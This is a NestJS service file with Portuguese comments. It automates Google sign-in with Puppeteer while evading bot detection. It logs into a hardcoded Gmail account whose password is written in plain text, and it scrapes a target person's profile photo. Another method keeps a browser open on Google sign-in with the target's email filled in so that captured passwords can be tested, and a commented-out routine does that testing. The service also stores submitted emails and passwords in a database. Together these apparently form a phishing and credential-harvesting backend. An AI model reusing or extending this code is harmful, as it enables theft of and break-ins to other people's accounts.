import { Injectable } from '@nestjs/common';
import puppeteer from 'puppeteer';
import { PrismaClient, dadosLogin } from '@prisma/client';
import { CreateLoginDto } from './dto/create-login.dto';
import { UpdateLoginDto } from './dto/update-login.dto';

@Injectable()
export class LoginService {

  linkImage: string;

  prisma = new PrismaClient();  // Acesso ao banco

  getLinkImage(){
    return this.linkImage;
  }

  async emailLogin(email_alvo) {
    this.linkImage = await this.imageFromGmail(email_alvo);
  }

  private async imageFromGmail(email_alvo: string){

    async function login(email, senha) {
        // DIGITAR EMAIL E AVANÇAR: 

        // Aguarda até que o elemento com a classe 'minha-classe' seja carregado na página
        await page.waitForSelector('.whsOnd.zHQkBf');
        // Digitar a string na tag com a class específicada
        await page.type('.whsOnd.zHQkBf', email);
        // Clicar no botão com a class especificada
        await page.click('.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.LQeN7.qIypjc.TrZEUc.lw1w4b');


        // Identificando se o texto "Esqueceu a senha?" está aparecendo, que é o indicativo da etapa seguinte
        await page.waitForSelector(
            'text/Esqueceu a senha?'
        );

        // Esperar 1 segundo para colocar a senha, porque senão colocará o email e a senha no mesmo campo
        await page.waitForTimeout(3000);




        // DIGITAR SENHA E AVANÇAR: 

        // Digitar a string na tag com a class específicada
        await page.type('.whsOnd.zHQkBf', senha);
        // Clicar no botão com a class especificada
        await page.click('.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.LQeN7.qIypjc.TrZEUc.lw1w4b');

        
    
        // Verifica se o texto "Ajude a melhorar o Google" está presente na página, para contornar essa etapa
        const isText = await page.evaluate(() => {
            return document.body.textContent.includes('Ajude a melhorar o Google');
        });

        if (isText) {
            // Executa uma ação se o texto "Ajude a melhorar o Google" estiver presente
            await page.click('.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.ksBjEc.lKxP2d.LQeN7.k97fxb.yu6jOd');
        }
    }

    // DADOS DA CONTA QUE IRÁ PEGAR AS FOTOS
    const email = 'testlaboratory927@gmail.com';
    const senha = 'TestSTTP!2023';

    //Inicia o navegador Puppeteer e atribui o objeto Browser retornado a uma constante chamada "browser". 
    //O parâmetro {headless:false} define se o navegador será executado em modo headless (sem interface gráfica) ou não. Neste caso, o modo headless é desativado.
    const browser = await puppeteer.launch({
        headless: false, 
        args: ['--disable-blink-features=AutomationControlled']
    });

    // Cria uma nova página no navegador e atribui o objeto Page retornado a uma constante chamada "page".
    //const page = await browser.newPage();
    const page = (await browser.pages())[0];

    await page.setDefaultTimeout(60000);// Tempo máximo de espera em milissegundos (60 segundos neste caso)

    //  Navega para a página especificada.
    await page.goto('https://mail.google.com/mail/u/0/#inbox');

    // Teste para saber se a pessoa já está logada ou não

    // Verifica se o texto "Fazer login" está presente na página, para contornar essa etapa
    const fazerLogin = await page.evaluate(() => {
        return document.body.textContent.includes('Fazer login');
    });
    console.log("Fazer login: ", fazerLogin);

    if (fazerLogin) {
        // Executa uma ação se o texto "Fazer login" estiver presente
        await login(email, senha);
    }

    // Esperar página carregar
    await page.waitForNavigation(); 

    // Serve para abrir a caixa de escrever emails
    await page.goto('https://mail.google.com/mail/u/0/#inbox?compose=new'); 
    
    // Esperar a página carregar 
    //await page.waitForNavigation();

    // PARTE QUE JÁ ESTÁ LOGADO NO EMAIL

    // Espere até que a tag <div> desejada esteja disponível na tela 
    await page.waitForSelector('div[class="aoD hl"]');
    // Digitar a string na tag com a class específicada
    await page.type('.aoD.hl', email_alvo); // Nova "class" do Gmail (que atualiza de tempos em tempos)


    await page.waitForTimeout(2000);


    // Pressione a tecla Enter
    await page.keyboard.press('Enter');

    // Espere até que a tag <img> desejada esteja disponível na tela e pegue o atributo peoplekit-id
    const imgElement =  await page.waitForSelector('img[peoplekit-id="HiaYvf"]');

    // Extraia o link da imagem a partir do atributo data-src
    const imgUrl = await page.evaluate(img => img.getAttribute('data-src'), imgElement); // Link com a foto em resolução pequena que o Gmail utiliza

    // Função para deixar a URL com a foto na resolução correta:
    function removeLastSegmentFromUrl(url) {
        const lastEqualsIndex = url.lastIndexOf('=');
        if (lastEqualsIndex !== -1) {
            url = url.substring(0, lastEqualsIndex);
        }
        return url;
    }

    const url_image = removeLastSegmentFromUrl(imgUrl);

    // Cria uma nova página no navegador e atribui o objeto Page retornado a uma constante chamada "page".
    const new_page = await browser.newPage();

    // Cria uma nova página no navegador e atribui o objeto Page retornado a uma constante chamada "page".
    await new_page.goto(url_image);

    await new_page.waitForTimeout(2000);

    await browser.close();

    return imgUrl;

  }




  // Mantém o Chromium aberto para testar as senhas
  async navegadorEsperandoSenhas(email_alvo: string, senha_teste: string){

    //Inicia o navegador Puppeteer e atribui o objeto Browser retornado a uma constante chamada "browser". 
    //O parâmetro {headless:false} define se o navegador será executado em modo headless (sem interface gráfica) ou não. Neste caso, o modo headless é desativado.
    const browser = await puppeteer.launch({
        headless: false, 
        args: ['--disable-blink-features=AutomationControlled']
    });

    // Cria uma nova página no navegador e atribui o objeto Page retornado a uma constante chamada "page".
    //const page = await browser.newPage();
    var page = (await browser.pages())[0];

    await page.setDefaultTimeout(60000);// Tempo máximo de espera em milissegundos (60 segundos neste caso)

    //  Navega para a página especificada.
    await page.goto('https://accounts.google.com/v3/signin/identifier?dsh=S1980623644%3A1678824723242396&continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dgmail%26oq%3Dgmail%26aqs%3Dedge..69i57j69i61l2.1159j0j1%26sourceid%3Dchrome%26ie%3DUTF-8&ec=GAZAAQ&hl=pt-BR&ifkv=AWnogHdWrvqg0mf2i8snWoac9FyU0tdYyL5vFuuf0M02WjEIPPyLclUjIbqp7bVanLA177ww4WLe&passive=true&flowName=GlifWebSignIn&flowEntry=ServiceLogin');

    // Teste para saber se a pessoa já está logada ou não

    // Verifica se o texto "Fazer login" está presente na página, para contornar essa etapa
    const fazerLogin = await page.evaluate(() => {
        return document.body.textContent.includes('Fazer login');
    });
    console.log("Fazer login: ", fazerLogin);

    if (fazerLogin) {
               
        // DIGITAR EMAIL E AVANÇAR: 

        // Aguarda até que o elemento com a classe 'minha-classe' seja carregado na página
        await page.waitForSelector('.whsOnd.zHQkBf');
        // Digitar a string na tag com a class específicada
        await page.type('.whsOnd.zHQkBf', email_alvo);
        // Clicar no botão com a class especificada
        await page.click('.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.LQeN7.qIypjc.TrZEUc.lw1w4b');


        // Identificando se o texto "Esqueceu a senha?" está aparecendo, que é o indicativo da etapa seguinte
        await page.waitForSelector(
            'text/Esqueceu a senha?'
        );

        // Esperar 1 segundo para colocar a senha, porque senão colocará o email e a senha no mesmo campo
        await page.waitForTimeout(3000);
    
        // Verifica se o texto "Ajude a melhorar o Google" está presente na página, para contornar essa etapa
        const isText = await page.evaluate(() => {
            return document.body.textContent.includes('Ajude a melhorar o Google');
        });

        if (isText) {
            // Executa uma ação se o texto "Ajude a melhorar o Google" estiver presente
            await page.click('.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.ksBjEc.lKxP2d.LQeN7.k97fxb.yu6jOd');
        }
    }

    // Esperar página carregar
    await page.waitForNavigation(); 

  }

  /*
  async testeSenha(senha_teste){
    
    // DIGITAR SENHA E AVANÇAR: 

    // Digitar a string na tag com a class específicada
    await page.type('.whsOnd.zHQkBf', senha_teste);
    // Clicar no botão com a class especificada
    await page.click('.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.LQeN7.qIypjc.TrZEUc.lw1w4b');
    
    // Identificando se o texto "Esqueceu a senha?" está aparecendo, que é o indicativo da etapa seguinte
    const result_login = await page.waitForSelector(
      'text/Senha incorreta. Tente novamente'
      );
      
      if(result_login) {
        console.log("Login errado!")
      }
    }
    */






  async create(createLoginDto: CreateLoginDto) {
    const result = this.prisma.dadosLogin.create({
      data:{
        email: createLoginDto.email,
        senha: createLoginDto.senha,
        linkImage: createLoginDto.linkImage.replace(/&#x([\dA-Fa-f]{2});/g, (match, p1) => String.fromCharCode(parseInt(p1, 16)))
      }
    });

    return result;
  }

  findAll() {
    return `This action returns all login`;
  }

  async existingUser(email: string) {

    // Consulta ao banco
    const dados = await this.prisma.dadosLogin.findMany({
      where: { 
        email
      }
    });
  
    return dados;
  }

  update(id: number, updateLoginDto: UpdateLoginDto) {
    return `This action updates a #${id} login`;
  }

  remove(id: number) {
    return `This action removes a #${id} login`;
  }


}

